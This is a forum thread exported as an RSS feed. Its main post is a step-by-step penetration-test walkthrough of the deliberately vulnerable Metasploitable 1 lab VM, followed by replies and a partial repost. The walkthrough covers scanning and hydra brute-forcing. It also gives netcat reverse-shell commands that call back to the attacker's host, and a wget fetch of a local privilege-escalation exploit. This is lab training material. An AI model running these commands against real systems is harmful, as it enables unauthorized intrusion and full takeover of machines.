@@ -1,0 +1,571 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
+  <channel>
+    <title>Metasploitable 1 - Walkthrough</title>
+    <link>https://d.clarkee.co.uk/t/metasploitable-1-walkthrough/3964</link>
+    <description>Hey people!
+
+During my learning process I experimented a lot with this VM. In my opinion the vulnerabilities on this VM are pretty simple and you can optimize and improve your methodology on it.
+On this walkthrough I will show you how I&#39;ll go through **without** using MSF, Nessus, OpenVAS, etc.
+
+
+For this I will using the basic setup of Kali.
+
+**Methodology:**
+1. Detect Living Host(s)
+2. Open TCP Ports
+3. Open UDP Ports
+4. Service Detection
+5. Service Enumeration
+6. User Enumeration from Services
+7. Password Profiling
+8. Brute Forcing
+9. Detect Running OS
+10. Simple Vulnerabilities Detection
+11. Manual Vulnerabilities Detection
+12. Exploit Research
+13. Exploit Fix
+14. Exploitation
+15. Post-Enumeration
+16. Privilege Escalation
+17. Proofs
+
+&gt; Notice thats my methodology which I developed for the OSCP and are **not** the steps I&#39;ll going through. So I will possibly jump or skip over the topics.
+
+# 1. Detect Living Host
+So at first I want to detect the IP of the metasploitable VM.
+I&#39;ll use nmap for it.
+
+`nmap -sn -n 10.11.1.0/24 | grep for | cut -d&quot; &quot; -f5`
+
+&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/3/36f4723c8c593bd654267a824f186ef0d8b6a2b6.PNG&quot; width=&quot;450&quot; height=&quot;220&quot;&gt;
+
+# 2. Open TCP ports
+Now, after I detected the IP of the target (**10.11.1.10**) I will run a light TCP scan and try to detect open ports and the services running on it.
+
+`nmap -n -Pn -sS 10.11.1.10 --open --reason -sV --top-ports 200`
+
+&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/3/38b387ab170610c7dfd3f9ae0ff9bcfaab5400af.PNG&quot; width=&quot;650&quot; height=&quot;300&quot;&gt;
+
+Sweet. Thats a lot of open ports. :smiley:  
+So lets run a full and aggressive TCP scan in the background and at the same time I&#39;ll manually scan Samba &amp; SMTP services which will hopefully receive some users for this machine.
+
+`# nmap -n -Pn -sS 10.11.1.10 --open --reason -A -p- &gt; metasploitable &amp;`
+
+Because I found a lot of open ports I&#39;ll jump to the **User Enumeration** topic.
+
+# 6. User Enumeration from Services
+The heavy scan is running in the background so we can proceed and try to enumerate from  the Samba service some users using **enum4linux**:
+`# enum4linux -U 10.11.1.10`
+
+Here is the output:
+&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/d/d132981c86d87291f48e0ce23098cbe2ff1b901c.PNG&quot; width=&quot;654&quot; height=&quot;500&quot;&gt;
+
+Now I will create a userlist of the Samba service that I will use later.
+`# !! | grep &#39;user:&#39; | cut -d&#39;[&#39; -f2 | cut -d&#39;]&#39; -f1 &gt; userlist`
+
+Lets check if I can find some users using **smtp-user-enum.py** with the VRFY command:
+`# smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t 10.11.1.10 &gt; smtp_users`
+
+Now I will generate an userlist of all the users I found.
+`# cat smtp_users | grep exists | cut -d&quot; &quot; -f2 &gt;&gt; users`
+
+&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/8/827603b7dcfd959cdb4cf244df584a197ae861d2.PNG&quot; width=&quot;690&quot; height=&quot;161&quot;&gt;
+
+Nice! 
+If you noticed from above the heavy TCP scan has been finished too.
+Lets see which new ports has been found.
+
+&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/d/d6d4f67f6d2951f5096ccc5e24b7e8ca5ec89e4c.PNG&quot; width=&quot;690&quot; height=&quot;235&quot;&gt;
+
+# 7. Password Profiling
+For the first step of password profiling I&#39;ll use the list of the usernames we previously enumerated as the first stage of my passwordlist.
+I will return to this point later when we take a look over other services.
+
+# 8. Brute Forcing
+Now the heavy scan shows me two new ports (3632 &amp; 8180). Next I will use **hydra** to bruteforce the FTP, SSH, Telnet,  NetBIOS, MySQL and PostgreSQL service and try to login. As credentials I will use enumerated usernames as passwords.
+
+**### FTP ###**
+`hydra -L users_metasploitable -e nsr ftp://10.11.1.10 -q -o ftp_login`
+
+&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/f/f761cb1f7e98224bc60789d1a717e1609ab3c377.PNG&quot; width=&quot;690&quot; height=&quot;217&quot;&gt;
+
+**### SSH ###**
+`hydra -L users_metasploitable -e nsr ssh://10.11.1.10 -q -o ssh_login`
+
+&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/4/47ad24cf863bb2029df21bfa7787dd221a982b74.PNG&quot; width=&quot;690&quot; height=&quot;202&quot;&gt;
+
+**### Telnet ###**
+`hydra -L users_metasploitable -e nsr telnet://10.11.1.10 -q -o telnet_login`
+
+&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/d/d04c427b9247043e9b6ee5eb98fa603f28e3632f.PNG&quot; width=&quot;690&quot; height=&quot;256&quot;&gt;
+
+**### NetBIOS ###**
+`hydra -L users_metasploitable -e nsr smb://10.11.1.10 -q -o smb_login`
+
+&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/4/4f66bfa5f4bfd2ab7f1a14fab847677f863fa0d2.PNG&quot; width=&quot;690&quot; height=&quot;205&quot;&gt;
+
+**### MySQL ###**
+`hydra -L users_metasploitable -e nsr mysql://10.11.1.10 -q -o mysql_login`
+
+&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/d/d98455f51d5a9e9f0ca0facc9a70a0d27a0c2515.PNG&quot; width=&quot;690&quot; height=&quot;189&quot;&gt;
+
+**### PostgreSQL ###**
+`hydra -L users_metasploitable -e nsr postgres://10.11.1.10 -q -o postgres_login`
+
+&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/3/35ca914f4ccd90491b01ad5a45afa0b085abf87f.PNG&quot; width=&quot;690&quot; height=&quot;188&quot;&gt;
+
+Very nice! 
+There are a lot of accounts we can use to login on the machine. :smiley:
+But first let me compare the results to one single list. 
+
+`cat ftp_login mysql_login postgres_login smb_login ssh_login telnet_login | grep host | column -t &gt; metasploitable_accounts`
+
+
+&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/9/9e74f66bcfb970721bbf0af47667ad6c733d2f83.PNG&quot; width=&quot;690&quot; height=&quot;362&quot;&gt;
+
+As you can see, it was a quick task and we have some accounts we can use to login but the user **msfadmin** looks like it could be in the sudoers group. So I will start with this user. 
+
+
+# 9. OS Detection
+To identify the exact OS informations I&#39;ll start just now to enumerate the exact OS, because the banners of the results from **nmap** can be false positive or just not exactly enough. So I have to identify the exact OS version manually using  ssh.
+
+So let me login using the SSH service:
+`# ssh msfadmin@10.11.1.10`
+`.. (yes/no)? yes`
+`... password: msfadmin`
+`$ uname -a`
+
+&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/6/6279c09a89a0aa6b0da3b2f08a2b423a074999b5.PNG&quot; width=&quot;690&quot; height=&quot;325&quot;&gt;
+
+Now lets take a look if we have access to run a shell with root privileges.
+
+`$ sudo -i`
+`password: msfadmin`
+
+&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/0/0e783b6b44871e1a3c3fa7f08ce0435de3da9c40.PNG&quot; width=&quot;690&quot; height=&quot;298&quot;&gt;
+
+
+# One of a lot ways are done!
+Now I have access to a full privileged account and I&#39;m controlling the system. There exist more other ways to pwn this machine. I showed you the first way I tried out. 
+
+Let&#39;s see if I can break into using another way.
+
+# 10. Simple Vulnerability Detection
+What I will do is a simple vulnerability scan with **nmap**.
+
+`# nmap --script vuln 10.11.1.10 -p- --open`
+
+This scan shows me a lot of vulnerable stuff but the most of them are SSL or DOS vulnerabilities. I picked up the **distcc** daemon because the vulnerability seems to be exploitable.
+
+&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/6/6a7b79331b915dfb106ec105fc424180532e83e8.PNG&quot; width=&quot;690&quot; height=&quot;312&quot;&gt;
+
+
+# 12. Exploit Research
+I found an exploit by using **searchsploit** pretty fast. There is just one result.
+
+`# searchsploit distcc`
+
+&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/7/74a65c8a4afbda233d1cf2257ab5df918c255a73.PNG&quot; width=&quot;690&quot; height=&quot;115&quot;&gt;
+
+Mh. The exploit is handled by MSF and I **don&#39;t** want to use it.
+So let me think a little bit. Did I missed something?
+How did I found this vulnerability? -&gt; Using **Nmap**.
+Ok. I used a script for that. 
+So let me take a look one more time at the results. 
+
+Oh.. I overlooked that the script (`distcc-cve2004-2687.nse`) used the `id` command for the &quot;Extra Information&quot; which shows me the **uid** of the current user. :slightly_frowning_face: * *shame* *
+So it looks like the **Nmap** sent this command to this service. Let me take a look over the documentation of this script from the homepage.
+NSE-doc: [distcc-cve2004-2687.nse](https://nmap.org/nsedoc/scripts/distcc-cve2004-2687.html)
+
+&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/f/ff3d7acf7ccbc4b438e003e6014f1eb58da18015.PNG&quot; width=&quot;564&quot; height=&quot;64&quot;&gt;
+
+# 14. Exploitation
+
+Let me change it to possibly get a bind shell using **netcat** at first and then try to connect to it.
+
+&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/5/5e73ce0db13acb02b9e1f28b7d7403066e9a0016.PNG&quot; width=&quot;542&quot; height=&quot;499&quot;&gt;
+
+Nice! Bind shell works and additional I found out the machine has netcat installed. Let me see if a reverse shell works too.
+So I setup a listener on port 6666 and then run the **nmap-script** with the cmd for a reverse shell.
+
+`# nmap 10.11.1.10 -p 3632 --script distcc-cve2004-2687.nse --script-args=&quot;distcc-cve2004-2687.cmd=&#39;nc -nv 10.11.1.11 6666 -e /bin/sh&#39;&quot;`
+
+&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/c/c3e99963c0f29de3b67fbd5647c273d7e40c1858.PNG&quot; width=&quot;690&quot; height=&quot;357&quot;&gt;
+
+Very nice! Now I have a reverse shell.
+Now I want to spawn a TTY using python. 
+
+`python -c &#39;import pty; pty.spawn(&quot;/bin/sh&quot;)&#39;`
+
+&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/2/283b92d7f58fb53d13a0b36138e01e5d296fddfc.PNG&quot; width=&quot;458&quot; height=&quot;174&quot;&gt;
+
+# 15. Post-Enumeration
+Now I want to get root without interactive mode for sudo. So I have to enumerate some stuff.
+
+`$ uname -a`
+`$ cat /proc/version`
+
+&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/3/366db23c4a441515932b3a26ddb78fc4c2b97516.PNG&quot; width=&quot;690&quot; height=&quot;119&quot;&gt;
+
+The kernel &amp; OS version seems to be outdated. * *.. You don&#39;t say..* *
+I take a quick search on google to find an privilege escalation exploit especially for this version.
+So I search for **Ubuntu 4.2.3-2ubuntu7**. Google shows me the name of this version called Hardy.
+
+&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/9/989a50e19359762fe8a30e503766f7e1e0263aae.PNG&quot; width=&quot;603&quot; height=&quot;29&quot;&gt;
+
+My next step is to google for this version name. And you can see a few interesting results.
+I searched a little bit about every exploit and found the [CVE-2009-1185](http://www.cvedetails.com/cve/cve-2009-1185) very pretty. I will try it out. In the results before I found it on the [exploit-db](https://www.exploit-db.com/exploits/8572/). So maybe I have it locally already.
+
+`searchsploit 8572 linux`
+
+&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/b/bdab2a221a6940893dfaa69e27b8e543074d5d5a.PNG&quot; width=&quot;690&quot; height=&quot;123&quot;&gt;
+
+Nice!
+
+# 16. Privilege Escalation
+Let&#39;s copy the exploit to my directory.
+
+`# locate 8572.c`
+`# cp /usr/share/exploitdb/platforms/lin_x86-64/local/8572.c privescal.c`
+
+I want to take a look inside the code to see if I have to take note for some configurations or usage.
+
+&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/3/3404c616628ee18c68f4bdbd7e0a708ada61f1bd.PNG&quot; width=&quot;690&quot; height=&quot;105&quot;&gt;
+
+So I have to pay attention to 
+1. right **PID of udevd** (PID - 1 as argv[1]), 
+2. **/tmp/run** and 
+3. the **payload** inside it. 
+
+Simple usage.
+But before I can transfer this exploit I have to setup a basic Python Webserver on port 8080.
+
+`# python -m SimpleHTTPServer 8080`
+
+After that I use the reverse shell to get the file with **wget** from my machine, compile the code, add my payload to /tmp/run and look for the PID.
+
+`$ wget http://10.11.1.11:8080/privescal.c`
+`$ gcc privescal.c -o privs`
+`$ echo &#39;#!/bin/sh\n/bin/netcat 10.11.1.11 5555 -e /bin/sh&#39; &gt; /tmp/run`
+`$ ps aux | grep udev`
+
+&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/e/ebdc374cfe43f923aabc6f39b284393dca9f4d02.PNG&quot; width=&quot;690&quot; height=&quot;288&quot;&gt;
+
+
+Now I will use the founded PID  - 1  (**2575**)  for this exploit. 
+
+After starting my listener I&#39;m ready to catch the shell...
+
+`# nc -nlvp 5555`
+`$ ./privs 2575`
+
+&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/0/056d14b78a41e36e4747c738c72c80dae8a52864.PNG&quot; width=&quot;690&quot; height=&quot;452&quot;&gt;
+
+# Done!
+
+
+&gt; If you have some advice or recommendation to improve my methodology, or want me to add more ways to it so feel free and just tell me that. 
+
+Thx and have a nice day!
+Cry0l1t3</description>
+    
+    <lastBuildDate>Sun, 05 Jan 2020 00:07:47 +0000</lastBuildDate>
+    <category>CTF</category>
+    <atom:link href="https://d.clarkee.co.uk/t/metasploitable-1-walkthrough/3964.rss" rel="self" type="application/rss+xml" />
+      <item>
+        <title>Metasploitable 1 - Walkthrough</title>
+        <dc:creator><![CDATA[pry0cc]]></dc:creator>
+        <description><![CDATA[
+            
+          <p><a href="https://d.clarkee.co.uk/t/metasploitable-1-walkthrough/3964/9">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/metasploitable-1-walkthrough/3964/9</link>
+        <pubDate>Sun, 05 Jan 2020 00:07:47 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-3964-9</guid>
+        <source url="https://d.clarkee.co.uk/t/metasploitable-1-walkthrough/3964.rss">Metasploitable 1 - Walkthrough</source>
+      </item>
+      <item>
+        <title>Metasploitable 1 - Walkthrough</title>
+        <dc:creator><![CDATA[system]]></dc:creator>
+        <description><![CDATA[
+            <p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
+          <p><a href="https://d.clarkee.co.uk/t/metasploitable-1-walkthrough/3964/8">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/metasploitable-1-walkthrough/3964/8</link>
+        <pubDate>Sun, 21 Jan 2018 00:42:58 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-3964-8</guid>
+        <source url="https://d.clarkee.co.uk/t/metasploitable-1-walkthrough/3964.rss">Metasploitable 1 - Walkthrough</source>
+      </item>
+      <item>
+        <title>Metasploitable 1 - Walkthrough</title>
+        <dc:creator><![CDATA[behk]]></dc:creator>
+        <description><![CDATA[
+            <p>I’d like to add an specific reference to this one, which happens to be a really good and free resource by the Offensive Security team.</p>
+<p>Metasploit Unleashed is a course (kinda, more like a paper on the solution) they developed which I think is important to anyone that wants to get involved with the solution, in this one they reference to do a lot of the testing with Metasploitable. (link below)</p>
+<p>Hope this enhances your post <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
+<p><a href="https://www.offensive-security.com/metasploit-unleashed/" class="onebox" target="_blank" rel="nofollow noopener">https://www.offensive-security.com/metasploit-unleashed/</a></p>
+          <p><a href="https://d.clarkee.co.uk/t/metasploitable-1-walkthrough/3964/7">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/metasploitable-1-walkthrough/3964/7</link>
+        <pubDate>Wed, 22 Nov 2017 17:49:02 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-3964-7</guid>
+        <source url="https://d.clarkee.co.uk/t/metasploitable-1-walkthrough/3964.rss">Metasploitable 1 - Walkthrough</source>
+      </item>
+      <item>
+        <title>Metasploitable 1 - Walkthrough</title>
+        <dc:creator><![CDATA[Cry0l1t3]]></dc:creator>
+        <description><![CDATA[
+            <aside class="quote no-group" data-username="Noswis" data-post="2" data-topic="3964" data-full="true">
+<div class="title">
+<div class="quote-controls"></div>
+<img alt="" width="24" height="24" src="https://d.clarkee.co.uk/letter_avatar_proxy/v4/letter/n/ba8739/48.png" class="avatar"> Noswis:</div>
+<blockquote>
+<p>Interesting read mate! I’d like to see in what other ways you were able to pwn the machine besides a brute-force attack.</p>
+</blockquote>
+</aside>
+<p>I will create a few extra ways soon. <img src="https://d.clarkee.co.uk/images/emoji/twitter/wink.png?v=15" title=":wink:" class="emoji" alt=":wink:" loading="lazy" width="20" height="20"></p>
+          <p><a href="https://d.clarkee.co.uk/t/metasploitable-1-walkthrough/3964/6">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/metasploitable-1-walkthrough/3964/6</link>
+        <pubDate>Wed, 22 Nov 2017 09:17:06 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-3964-6</guid>
+        <source url="https://d.clarkee.co.uk/t/metasploitable-1-walkthrough/3964.rss">Metasploitable 1 - Walkthrough</source>
+      </item>
+      <item>
+        <title>Metasploitable 1 - Walkthrough</title>
+        <dc:creator><![CDATA[Retr1]]></dc:creator>
+        <description><![CDATA[
+            <p>i know i’m a bit late to the party, but a nice walkthrough right there.</p>
+<p>maybe a little bit less screenshots would’ve been easier on the eyes, but other than that great writeup</p>
+          <p><a href="https://d.clarkee.co.uk/t/metasploitable-1-walkthrough/3964/5">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/metasploitable-1-walkthrough/3964/5</link>
+        <pubDate>Sun, 05 Nov 2017 11:08:07 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-3964-5</guid>
+        <source url="https://d.clarkee.co.uk/t/metasploitable-1-walkthrough/3964.rss">Metasploitable 1 - Walkthrough</source>
+      </item>
+      <item>
+        <title>Metasploitable 1 - Walkthrough</title>
+        <dc:creator><![CDATA[ripmeout]]></dc:creator>
+        <description><![CDATA[
+            <p>You might wanna check out <a href="https://www.vulnhub.com/" rel="nofollow noopener">VulnHub</a>.</p>
+          <p><a href="https://d.clarkee.co.uk/t/metasploitable-1-walkthrough/3964/4">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/metasploitable-1-walkthrough/3964/4</link>
+        <pubDate>Tue, 24 Oct 2017 13:55:11 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-3964-4</guid>
+        <source url="https://d.clarkee.co.uk/t/metasploitable-1-walkthrough/3964.rss">Metasploitable 1 - Walkthrough</source>
+      </item>
+      <item>
+        <title>Metasploitable 1 - Walkthrough</title>
+        <dc:creator><![CDATA[Sirius]]></dc:creator>
+        <description><![CDATA[
+            <p>Especially considering this particular VM is FILLED with holes. ;3</p>
+          <p><a href="https://d.clarkee.co.uk/t/metasploitable-1-walkthrough/3964/3">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/metasploitable-1-walkthrough/3964/3</link>
+        <pubDate>Thu, 19 Oct 2017 17:24:33 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-3964-3</guid>
+        <source url="https://d.clarkee.co.uk/t/metasploitable-1-walkthrough/3964.rss">Metasploitable 1 - Walkthrough</source>
+      </item>
+      <item>
+        <title>Metasploitable 1 - Walkthrough</title>
+        <dc:creator><![CDATA[Noswis]]></dc:creator>
+        <description><![CDATA[
+            <p>Interesting read mate! I’d like to see in what other ways you were able to pwn the machine besides a brute-force attack.</p>
+          <p><a href="https://d.clarkee.co.uk/t/metasploitable-1-walkthrough/3964/2">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/metasploitable-1-walkthrough/3964/2</link>
+        <pubDate>Thu, 19 Oct 2017 09:23:22 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-3964-2</guid>
+        <source url="https://d.clarkee.co.uk/t/metasploitable-1-walkthrough/3964.rss">Metasploitable 1 - Walkthrough</source>
+      </item>
+      <item>
+        <title>Metasploitable 1 - Walkthrough</title>
+        <dc:creator><![CDATA[Cry0l1t3]]></dc:creator>
+        <description><![CDATA[
+            <p>Hey people!</p>
+<p>During my learning process I experimented a lot with this VM. In my opinion the vulnerabilities on this VM are pretty simple and you can optimize and improve your methodology on it.<br>
+On this walkthrough I will show you how I’ll go through <strong>without</strong> using MSF, Nessus, OpenVAS, etc.</p>
+<p>For this I will using the basic setup of Kali.</p>
+<p><strong>Methodology:</strong></p>
+<ol>
+<li>Detect Living Host(s)</li>
+<li>Open TCP Ports</li>
+<li>Open UDP Ports</li>
+<li>Service Detection</li>
+<li>Service Enumeration</li>
+<li>User Enumeration from Services</li>
+<li>Password Profiling</li>
+<li>Brute Forcing</li>
+<li>Detect Running OS</li>
+<li>Simple Vulnerabilities Detection</li>
+<li>Manual Vulnerabilities Detection</li>
+<li>Exploit Research</li>
+<li>Exploit Fix</li>
+<li>Exploitation</li>
+<li>Post-Enumeration</li>
+<li>Privilege Escalation</li>
+<li>Proofs</li>
+</ol>
+<blockquote>
+<p>Notice thats my methodology which I developed for the OSCP and are <strong>not</strong> the steps I’ll going through. So I will possibly jump or skip over the topics.</p>
+</blockquote>
+<h1><a name="p-16696-h-1-detect-living-host-1" class="anchor" href="https://d.clarkee.co.uk#p-16696-h-1-detect-living-host-1"></a>1. Detect Living Host</h1>
+<p>So at first I want to detect the IP of the metasploitable VM.<br>
+I’ll use nmap for it.</p>
+<p><code>nmap -sn -n 10.11.1.0/24 | grep for | cut -d" " -f5</code></p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="//0x00sec.s3.amazonaws.com/original/2X/3/36f4723c8c593bd654267a824f186ef0d8b6a2b6.PNG" data-download-href="/uploads/short-url/7Q9vr6i5nIUsVSgVEnt0M9GXake.PNG?dl=1" title="1..PNG" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/2X/3/36f4723c8c593bd654267a824f186ef0d8b6a2b6.PNG" width="450" height="220"></a></div><p></p>
+<h1><a name="p-16696-h-2-open-tcp-ports-2" class="anchor" href="https://d.clarkee.co.uk#p-16696-h-2-open-tcp-ports-2"></a>2. Open TCP ports</h1>
+<p>Now, after I detected the IP of the target (<strong>10.11.1.10</strong>) I will run a light TCP scan and try to detect open ports and the services running on it.</p>
+<p><code>nmap -n -Pn -sS 10.11.1.10 --open --reason -sV --top-ports 200</code></p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="//0x00sec.s3.amazonaws.com/original/2X/3/38b387ab170610c7dfd3f9ae0ff9bcfaab5400af.PNG" data-download-href="/uploads/short-url/85BnwN6BI0Of0sTqXRw3hLCPFi7.png?dl=1" title="2.PNG" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/2X/3/38b387ab170610c7dfd3f9ae0ff9bcfaab5400af.PNG" width="650" height="300"></a></div><p></p>
+<p>Sweet. Thats a lot of open ports. <img src="https://d.clarkee.co.uk/images/emoji/twitter/smiley.png?v=15" title=":smiley:" class="emoji" alt=":smiley:" loading="lazy" width="20" height="20"><br>
+So lets run a full and aggressive TCP scan in the background and at the same time I’ll manually scan Samba &amp; SMTP services which will hopefully receive some users for this machine.</p>
+<p><code># nmap -n -Pn -sS 10.11.1.10 --open --reason -A -p- &gt; metasploitable &amp;</code></p>
+<p>Because I found a lot of open ports I’ll jump to the <strong>User Enumeration</strong> topic.</p>
+<h1><a name="p-16696-h-6-user-enumeration-from-services-3" class="anchor" href="https://d.clarkee.co.uk#p-16696-h-6-user-enumeration-from-services-3"></a>6. User Enumeration from Services</h1>
+<p>The heavy scan is running in the background so we can proceed and try to enumerate from  the Samba service some users using <strong>enum4linux</strong>:<br>
+<code># enum4linux -U 10.11.1.10</code></p>
+<p>Here is the output:<br>
+</p><div class="lightbox-wrapper"><a class="lightbox" href="//0x00sec.s3.amazonaws.com/original/2X/d/d132981c86d87291f48e0ce23098cbe2ff1b901c.PNG" data-download-href="/uploads/short-url/tQEbI01XSXIEmU2coHyD67wHZmc.png?dl=1" title="3.PNG" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/2X/d/d132981c86d87291f48e0ce23098cbe2ff1b901c.PNG" width="654" height="500"></a></div><p></p>
+<p>Now I will create a userlist of the Samba service that I will use later.<br>
+<code># !! | grep 'user:' | cut -d'[' -f2 | cut -d']' -f1 &gt; userlist</code></p>
+<p>Lets check if I can find some users using <strong>smtp-user-enum.py</strong> with the VRFY command:<br>
+<code># smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t 10.11.1.10 &gt; smtp_users</code></p>
+<p>Now I will generate an userlist of all the users I found.<br>
+<code># cat smtp_users | grep exists | cut -d" " -f2 &gt;&gt; users</code></p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="//0x00sec.s3.amazonaws.com/original/2X/8/827603b7dcfd959cdb4cf244df584a197ae861d2.PNG" data-download-href="/uploads/short-url/iC6UNwN8QvsguBLyqaAXH2geo7M.PNG?dl=1" title="5.PNG" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/2X/8/827603b7dcfd959cdb4cf244df584a197ae861d2.PNG" width="690" height="161"></a></div><p></p>
+<p>Nice!<br>
+If you noticed from above the heavy TCP scan has been finished too.<br>
+Lets see which new ports has been found.</p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="//0x00sec.s3.amazonaws.com/original/2X/d/d6d4f67f6d2951f5096ccc5e24b7e8ca5ec89e4c.PNG" data-download-href="/uploads/short-url/uEurS3rRnIclSL612gxqAF1QtPK.PNG?dl=1" title="6.PNG" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/2X/d/d6d4f67f6d2951f5096ccc5e24b7e8ca5ec89e4c.PNG" width="690" height="235"></a></div><p></p>
+<h1><a name="p-16696-h-7-password-profiling-4" class="anchor" href="https://d.clarkee.co.uk#p-16696-h-7-password-profiling-4"></a>7. Password Profiling</h1>
+<p>For the first step of password profiling I’ll use the list of the usernames we previously enumerated as the first stage of my passwordlist.<br>
+I will return to this point later when we take a look over other services.</p>
+<h1><a name="p-16696-h-8-brute-forcing-5" class="anchor" href="https://d.clarkee.co.uk#p-16696-h-8-brute-forcing-5"></a>8. Brute Forcing</h1>
+<p>Now the heavy scan shows me two new ports (3632 &amp; 8180). Next I will use <strong>hydra</strong> to bruteforce the FTP, SSH, Telnet,  NetBIOS, MySQL and PostgreSQL service and try to login. As credentials I will use enumerated usernames as passwords.</p>
+<p><strong>### FTP ###</strong><br>
+<code>hydra -L users_metasploitable -e nsr ftp://10.11.1.10 -q -o ftp_login</code></p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="//0x00sec.s3.amazonaws.com/original/2X/f/f761cb1f7e98224bc60789d1a717e1609ab3c377.PNG" data-download-href="/uploads/short-url/zirsjylmi2eQZL18fhZ2YCPzROL.PNG?dl=1" title="8.PNG" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/2X/f/f761cb1f7e98224bc60789d1a717e1609ab3c377.PNG" width="690" height="217"></a></div><p></p>
+<p><strong>### SSH ###</strong><br>
+<code>hydra -L users_metasploitable -e nsr ssh://10.11.1.10 -q -o ssh_login</code></p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="//0x00sec.s3.amazonaws.com/original/2X/4/47ad24cf863bb2029df21bfa7787dd221a982b74.PNG" data-download-href="/uploads/short-url/ae4Rh0MDLUA93FgYW7xOPLutcH2.PNG?dl=1" title="9.PNG" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/2X/4/47ad24cf863bb2029df21bfa7787dd221a982b74.PNG" width="690" height="202"></a></div><p></p>
+<p><strong>### Telnet ###</strong><br>
+<code>hydra -L users_metasploitable -e nsr telnet://10.11.1.10 -q -o telnet_login</code></p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="//0x00sec.s3.amazonaws.com/original/2X/d/d04c427b9247043e9b6ee5eb98fa603f28e3632f.PNG" data-download-href="/uploads/short-url/tIGHmT8B1yEWpSNIfCJd6CMakJ9.PNG?dl=1" title="10.PNG" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/2X/d/d04c427b9247043e9b6ee5eb98fa603f28e3632f.PNG" width="690" height="256"></a></div><p></p>
+<p><strong>### NetBIOS ###</strong><br>
+<code>hydra -L users_metasploitable -e nsr smb://10.11.1.10 -q -o smb_login</code></p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="//0x00sec.s3.amazonaws.com/original/2X/4/4f66bfa5f4bfd2ab7f1a14fab847677f863fa0d2.PNG" data-download-href="/uploads/short-url/bkpRcsQwanelUngyGBQaAzqBjqy.PNG?dl=1" title="11.PNG" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/2X/4/4f66bfa5f4bfd2ab7f1a14fab847677f863fa0d2.PNG" width="690" height="205"></a></div><p></p>
+<p><strong>### MySQL ###</strong><br>
+<code>hydra -L users_metasploitable -e nsr mysql://10.11.1.10 -q -o mysql_login</code></p>
